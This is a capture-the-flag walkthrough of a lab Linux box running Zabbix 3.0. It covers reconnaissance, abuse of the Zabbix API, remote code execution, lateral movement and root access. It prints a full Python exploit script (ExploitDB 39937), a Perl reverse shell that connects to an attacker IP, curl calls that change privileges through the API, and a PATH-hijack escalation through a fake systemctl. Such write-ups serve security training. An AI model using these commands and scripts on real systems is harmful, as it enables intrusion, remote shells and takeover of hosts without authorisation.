<p>Start with the core loop every penetration tester follows:</p>
<pre><code>Enumerate → Identify → Exploit → Pivot → Repeat
</code></pre>
<p>At every step, ask yourself:</p>
<ul>
<li><strong>What is running here?</strong></li>
<li><strong>What version is it?</strong></li>
<li><strong>Does it trust user input it shouldn't?</strong></li>
<li><strong>What privileges does this process run as?</strong></li>
<li><strong>Can I abuse this to move somewhere I shouldn't be?</strong></li>
</ul>
<p>Enumerate again after every access change; each new context exposes different services, files, and privileges.</p>
<hr>
<h2 id="phase-1-reconnaissance">Phase 1: Reconnaissance</h2>
<h3 id="step-1-port-scanning-with-nmap">Step 1: Port Scanning with Nmap</h3>
<p>The very first thing we do against any target is find out what services are exposed. We use <strong>nmap</strong> - a network scanner that sends probes to ports and interprets responses to identify open services.</p>
<pre><code class="language-bash" data-language="bash">nmap -sV -sT -sC 10.129.1.198
</code></pre>
<p><strong>Flag breakdown:</strong></p>
<ul>
<li><code>-sV</code> : Probe open ports to determine service and version</li>
<li><code>-sT</code> : TCP connect scan (more reliable than SYN scan without root)</li>
<li><code>-sC</code> : Run default NSE scripts (grabs banners, checks common vulns)</li>
</ul>
<p><strong>Output:</strong></p>
<pre><code>22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4
80/tcp open  http    Apache httpd 2.4.29 (Ubuntu)
</code></pre>
<p><strong>What this tells us:</strong></p>
<ul>
<li>Port 22 (SSH) is open - potential entry point if we find credentials</li>
<li>Port 80 (HTTP) is open - a web application to explore</li>
<li>It's Ubuntu Linux - good to know for exploit compatibility</li>
</ul>
<p> Two ports means a small attack surface. SSH usually requires credentials we don't have yet, so HTTP is the obvious starting point. The Apache version (2.4.29) is old - worth noting for potential vulnerabilities later.</p>
<hr>
<h2 id="phase-2-web-enumeration">Phase 2: Web Enumeration</h2>
<h3 id="step-2-browse-to-port-80">Step 2: Browse to Port 80</h3>
<p>Open a browser and visit <code>http://10.129.1.198</code>. You'll see the <strong>default Apache2 "It works!" page</strong>. This tells us:</p>
<ul>
<li>Apache is installed but no custom web app is served at the root</li>
<li>There are likely subdirectories hosting the real application</li>
<li>The admin left the default page - potentially an oversight</li>
</ul>
<p> A default Apache page is actually a clue, not a dead end. It means there's almost certainly something hidden in a subdirectory. Time to brute-force directories.</p>
<hr>
<h3 id="step-3-directory-brute-forcing-with-gobuster">Step 3: Directory Brute Forcing with Gobuster</h3>
<p>We use <strong>gobuster</strong> to discover hidden paths by trying thousands of common directory names:</p>
<pre><code class="language-bash" data-language="bash">gobuster dir -u http://10.129.1.198/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</code></pre>
<p><strong>Flag breakdown:</strong></p>
<ul>
<li><code>dir</code> : Directory enumeration mode</li>
<li><code>-u</code> : Target URL</li>
<li><code>-w</code> : Wordlist to use (medium = ~220,000 entries)</li>
</ul>
<p><strong>Output:</strong></p>
<pre><code>/zabbix  (Status: 301)
</code></pre>
<p><strong>What this tells us:</strong> There's a <code>/zabbix</code> directory - Zabbix is an open-source IT monitoring platform. Finding it changes our entire attack direction.</p>
<p> Monitoring platforms are useful sources. They have:</p>
<ul>
<li>Agent software installed on hosts (which can execute commands)</li>
<li>Credentials stored in configuration</li>
<li>APIs that can be abused</li>
<li>Often misconfigured access controls</li>
</ul>
<hr>
<h2 id="phase-3-gaining-access-to-zabbix">Phase 3: Gaining Access to Zabbix</h2>
<h3 id="step-4-explore-the-zabbix-login-page">Step 4: Explore the Zabbix Login Page</h3>
<p>Visit <code>http://10.129.1.198/zabbix</code>. You'll see a login page for <strong>Zabbix 3.0.21</strong>.</p>
<p>Notice the <strong>"Sign in as guest"</strong> option. Click it.</p>
<p><strong>Why guest access matters:</strong> Guest accounts in monitoring systems often have read-only access to dashboards. Even read-only data can reveal hostnames, usernames, running scripts, and infrastructure details - all useful intelligence.</p>
<hr>
<h3 id="step-5-enumerate-as-guest">Step 5: Enumerate as Guest</h3>
<p>After logging in as guest, navigate to <strong>Monitoring → Latest data</strong>.</p>
<p>You'll see:</p>
<pre><code>Zapper's Backup Script    Last value: 0
</code></pre>
<p><strong>What this tells us:</strong> There's a user named <strong>zapper</strong> on this system, and they have a backup script registered in Zabbix.</p>
<p> Usernames are half of a credential pair. When you find a username in one place, immediately try it everywhere - especially as a password. People reuse usernames as passwords more often than you'd think.</p>
<hr>
<h3 id="step-6-try-logging-in-as-zapper">Step 6: Try Logging in as Zapper</h3>
<p>Go back to the Zabbix login page and try:</p>
<ul>
<li><strong>Username:</strong> <code>zapper</code></li>
<li><strong>Password:</strong> <code>REDACTED</code></li>
</ul>
<p><strong>Result:</strong> <code>GUI access disabled</code></p>
<p>This means the credentials work (Zabbix accepted them) but zapper's user group doesn't allow GUI login. This is a configuration restriction, not a wrong password.</p>
<p> "GUI access disabled" is actually good news - it confirms the credentials are valid. Now we just need to change zapper's group permissions. Since Zabbix has an API, we can do this programmatically without needing GUI access.</p>
<hr>
<h3 id="step-7-authenticate-via-the-zabbix-api">Step 7: Authenticate via the Zabbix API</h3>
<p>Zabbix exposes a JSON-RPC API at <code>/zabbix/api_jsonrpc.php</code>. We can authenticate and perform administrative actions through it even without GUI access.</p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"user.login","params":{"user":"zapper","password":"REDACTED"},"id":1}'
</code></pre>
<p><strong>Response:</strong></p>
<pre><code class="language-json" data-language="json">{"jsonrpc":"2.0","result":"REDACTED_HASH_OR_FLAG","id":1}
</code></pre>
<p>The <code>result</code> value is our <strong>auth token</strong> - a session key we include in all future API calls to prove we're authenticated.</p>
<p> APIs often have weaker access controls than the GUI. A GUI might show a button as greyed out or hidden, but the API endpoint behind it is still callable. look for APIs when the GUI blocks you.</p>
<hr>
<h3 id="step-8-create-a-new-user-group-with-gui-access">Step 8: Create a New User Group with GUI Access</h3>
<p>Now we create a new Zabbix user group that allows GUI access:</p>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"usergroup.create",
    "params":{"name":"guiaccess","gui_access":0,"users_status":0},
    "auth":"REDACTED",
    "id":2
  }'
</code></pre>
<p><strong>Parameters explained:</strong></p>
<ul>
<li><code>gui_access: 0</code> : System default (allows GUI login)</li>
<li><code>users_status: 0</code> : Users are enabled (not disabled)</li>
</ul>
<p><strong>Response:</strong></p>
<pre><code class="language-json" data-language="json">{"result":{"usrgrpids":["13"]}}
</code></pre>
<p>New group created with ID <code>13</code>.</p>
<p> We're not breaking in - we're using a legitimate API with legitimate credentials to change a configuration. This is the line between exploitation and authorized use. On a pentest, this is valid. The vulnerability is that zapper had API access despite being locked out of the GUI.</p>
<hr>
<h3 id="step-9-get-zapper-s-user-id">Step 9: Get Zapper's User ID</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"user.get",
    "params":{"output":"extend","filter":{"alias":"zapper"}},
    "auth":"REDACTED",
    "id":3
  }'
</code></pre>
<p><strong>Response:</strong> <code>userid: 3</code></p>
<p>We need the user ID to modify the user's group membership via the API.</p>
<hr>
<h3 id="step-10-add-zapper-to-the-new-group">Step 10: Add Zapper to the New Group</h3>
<pre><code class="language-bash" data-language="bash">curl -s -X POST http://10.129.1.198/zabbix/api_jsonrpc.php \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"user.update",
    "params":{"userid":"3","usrgrps":[{"usrgrpid":"13"}]},
    "auth":"REDACTED",
    "id":4
  }'
</code></pre>
<p>This removes zapper from the "No access to frontend" group and places them in our new GUI-enabled group.</p>
<hr>
<h3 id="step-11-login-to-zabbix-gui-as-zapper">Step 11: Login to Zabbix GUI as Zapper</h3>
<p>Go back to <code>http://10.129.1.198/zabbix</code> and login with <code>zapper:zapper</code>.</p>
<p>You now have full dashboard access.</p>
<p>Navigate to <strong>Configuration → Hosts</strong> and click on <strong>"Zipper"</strong>. The URL will show:</p>
<pre><code>hostid=10106
</code></pre>
<p>Note this down - we need it for the exploit.</p>

<h2 id="phase-4-remote-code-execution">Phase 4: Remote Code Execution</h2>
<h3 id="step-12-understanding-the-zabbix-rce-vulnerability">Step 12: Understanding the Zabbix RCE Vulnerability</h3>
<p>Zabbix allows administrators to create <strong>scripts</strong> that execute on monitored hosts via the Zabbix agent. The agent runs on the target machine and executes commands sent from the Zabbix server.</p>
<p>The exploit (CVE-N/A, ExploitDB #39937) abuses this by:</p>
<ol>
<li>Updating an existing script's command to our payload</li>
<li>Executing that script against our target host</li>
</ol>
<p>The critical setting is <code>execute_on</code>:</p>
<ul>
<li><code>1</code> = Execute on the <strong>Zabbix server</strong> (a Docker container in this case - a rabbit hole)</li>
<li><code>0</code> = Execute on the <strong>Zabbix agent</strong> (the actual target machine)</li>
</ul>
<p> Read the code of an exploit before running it. The original exploit used <code>execute_on: 1</code> (server), which would give you a shell inside a Docker container - not the host. Understanding what the exploit actually does prevents wasted time.</p>
<hr>
<h3 id="step-13-download-and-modify-the-exploit">Step 13: Download and Modify the Exploit</h3>
<pre><code class="language-bash" data-language="bash">searchsploit -m 39937
</code></pre>
<p>We modify it with:</p>
<ul>
<li>Correct target IP and Zabbix path</li>
<li><code>zapper:zapper</code> credentials</li>
<li><code>hostid: 10106</code></li>
<li><code>execute_on: 0</code> in both the <code>script.update</code> and <code>script.execute</code> payloads</li>
<li>Convert from Python 2 to Python 3 (<code>raw_input</code> → <code>input</code>, <code>print</code> statements)</li>
<li>Comment out the final print line (it crashes when the shell spawns)</li>
</ul>
<p>The final exploit (<code>39937.py</code>):</p>
<pre><code class="language-python" data-language="python">#!/usr/bin/env python3
import requests, json, readline

ZABIX_ROOT = 'http://10.129.1.198/zabbix'
url = ZABIX_ROOT + '/api_jsonrpc.php'
login = 'zapper'
password = 'REDACTED'
hostid = '10106'

payload = {"jsonrpc":"2.0","method":"user.login",
           "params":{'user':login,'password':password},"auth":None,"id":0}
headers = {'content-type':'application/json'}
auth = requests.post(url, data=json.dumps(payload), headers=headers).json()

while True:
    cmd = input('\033[41m[zabbix_cmd]&gt;&gt;: \033[0m ')
    if cmd == "quit": break

    payload = {"jsonrpc":"2.0","method":"script.update",
               "params":{"scriptid":"1","command":cmd,"execute_on":"0"},
               "auth":auth['result'],"id":0}
    requests.post(url, data=json.dumps(payload), headers=headers)

    payload = {"jsonrpc":"2.0","method":"script.execute",
               "params":{"scriptid":"1","hostid":hostid},
               "auth":auth['result'],"id":0,"execute_on":"0"}
    cmd_exe = requests.post(url, data=json.dumps(payload), headers=headers).json()
#   print(cmd_exe["result"]["value"])
</code></pre>

<h3 id="step-14-get-a-reverse-shell">Step 14: Get a Reverse Shell</h3>
<p>Start a netcat listener on your Kali machine:</p>
<pre><code class="language-bash" data-language="bash">nc -lvnp 1337
</code></pre>
<p>Run the exploit:</p>
<pre><code class="language-bash" data-language="bash">python3 39937.py
</code></pre>
<p>At the prompt, the bash reverse shell dies immediately. This is a shell stability issue - the Zabbix agent spawns the process in a way that kills it quickly. Instead, use the <strong>Perl reverse shell</strong> which is more stable:</p>
<pre><code>perl -e 'use Socket;$i="10.10.16.84";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre>
<p><strong>Why Perl works when Bash doesn't:</strong> Perl establishes the network connection within its own runtime before spawning the shell, making it independent of the parent process. Bash's <code>bash -i</code> relies on the terminal being kept alive by the parent.</p>
<p>You now have a shell:</p>
<pre><code>uid=107(zabbix) gid=113(zabbix) groups=113(zabbix)
</code></pre>

<h2 id="phase-5-lateral-movement-to-zapper">Phase 5: Lateral Movement to Zapper</h2>
<h3 id="step-15-find-the-hardcoded-password">Step 15: Find the Hardcoded Password</h3>
<p>We're running as the <code>zabbix</code> service account. This account is low-privilege and doesn't have access to user home directories. But we spotted earlier that zapper has a backup script in Zabbix. Read it:</p>
<pre><code class="language-bash" data-language="bash">cat /home/zapper/utils/backup.sh
</code></pre>
<p><strong>Output:</strong></p>
<pre><code class="language-bash" data-language="bash">#!/bin/bash
/usr/bin/7z a /backups/zapper_backup-$(/bin/date +%F).7z -pZippityDoDah /home/zapper/utils/* &amp;&gt;/dev/null
</code></pre>
<p>The <code>-p</code> flag in 7z sets a password for the archive. The password <code>REDACTED</code> is hardcoded in plaintext.</p>
<p> Scripts are often overlooked as a source of credentials. Developers hardcode passwords into scripts for convenience, thinking "no one will read this." Always look at scripts, config files, and anything that automates a task - they frequently contain credentials.</p>

<h3 id="step-16-switch-to-zapper">Step 16: Switch to Zapper</h3>
<pre><code class="language-bash" data-language="bash">su zapper
# Password: REDACTED
</code></pre>
<pre><code class="language-bash" data-language="bash">cat /home/zapper/user.txt
# cf479[redacted]c809188
</code></pre>
<p><strong>User flag captured.</strong></p>
<hr>
<h2 id="phase-6-privilege-escalation-to-root">Phase 6: Privilege Escalation to Root</h2>
<h3 id="step-17-enumerate-for-privilege-escalation">Step 17: Enumerate for Privilege Escalation</h3>
<p>The first thing to check when you get a new user shell is what special privileges that user has:</p>
<pre><code class="language-bash" data-language="bash">ls -la /home/zapper/utils/
</code></pre>
<p><strong>Output:</strong></p>
<pre><code>-rwsr-sr-x 1 root root 7556 Sep  8 2018 zabbix-service
</code></pre>
<p>The <code>s</code> in <code>rws</code> means this is a <strong>SUID binary</strong> - it runs as root regardless of who executes it. This is a massive privilege escalation opportunity.</p>
<p> SUID binaries are one of the most common privesc paths on Linux. When a binary is SUID root, any code it executes inherits root privileges. If we can control what code it runs - we get root.</p>
<hr>
<h3 id="step-18-analyze-the-suid-binary">Step 18: Analyze the SUID Binary</h3>
<p>We use <code>strings</code> to extract readable text from the binary without needing to reverse engineer it:</p>
<pre><code class="language-bash" data-language="bash">strings /home/zapper/utils/zabbix-service
</code></pre>
<p>Key lines in the output:</p>
<pre><code>start or stop?: 
start
systemctl daemon-reload &amp;&amp; systemctl start zabbix-agent
stop
systemctl stop zabbix-agent
</code></pre>
<p>The binary calls <code>systemctl</code> <strong>without an absolute path</strong> (i.e., it doesn't use <code>/bin/systemctl</code>). Instead it relies on the shell's <code>PATH</code> environment variable to find <code>systemctl</code>.</p>
<p><strong>This is the vulnerability:</strong> If we can put a fake <code>systemctl</code> binary somewhere that appears earlier in the PATH, the SUID binary will execute OUR binary as root.</p>
<hr>
<h3 id="step-19-create-a-fake-systemctl-binary">Step 19: Create a Fake systemctl Binary</h3>
<p>We create a malicious <code>systemctl</code> that simply spawns <code>/bin/bash</code>:</p>
<pre><code class="language-bash" data-language="bash">cat &gt; /home/zapper/utils/systemctl &lt;&lt; 'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /home/zapper/utils/systemctl
</code></pre>
<p><strong>Why <code>/bin/bash</code>?</strong> When the SUID binary runs as root and calls our fake <code>systemctl</code>, it will execute <code>/bin/bash</code> with root privileges - giving us an interactive root shell.</p>
<hr>
<h3 id="step-20-hijack-the-path">Step 20: Hijack the PATH</h3>
<p>The <code>PATH</code> variable is a list of directories the shell searches when you type a command. By default, <code>/home/zapper/utils</code> is not in PATH. We add it to the <strong>front</strong> so it's searched first:</p>
<pre><code class="language-bash" data-language="bash">export PATH=/home/zapper/utils:$PATH
</code></pre>
<p>Now when any program (including our SUID binary) calls <code>systemctl</code>, the shell finds our fake one in <code>/home/zapper/utils/</code> before the real one in <code>/bin/</code>.</p>
<p>PATH hijacking works when a privileged process resolves a command name through an attacker-influenced search path. A privileged binary should call trusted executables by absolute path.</p>
<hr>
<h3 id="step-21-execute-the-suid-binary">Step 21: Execute the SUID Binary</h3>
<pre><code class="language-bash" data-language="bash">/home/zapper/utils/zabbix-service
# start or stop?: start
</code></pre>
<p><strong>Result:</strong></p>
<pre><code>root@zipper:/# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>
<p>We are root.</p>
<pre><code class="language-bash" data-language="bash">cat /root/root.txt
# e24aa[redacted]a6cc
</code></pre>
<p><strong>Root flag captured.</strong></p>

<h2 id="lessons-learned">Lessons Learned</h2>
<h3 id="vulnerability-chain-summary">Vulnerability Chain Summary</h3>
<pre><code>Default Apache page
    → Gobuster reveals /zabbix
        → Guest login reveals username "zapper"
            → zapper:zapper credential works (username = password)
                → API bypasses GUI restriction
                    → Zabbix RCE via agent script execution
                        → Shell as zabbix
                            → Hardcoded password in backup.sh
                                → Shell as zapper (user flag)
                                    → SUID binary calls systemctl without full path
                                        → PATH hijack → root (root flag)
</code></pre>
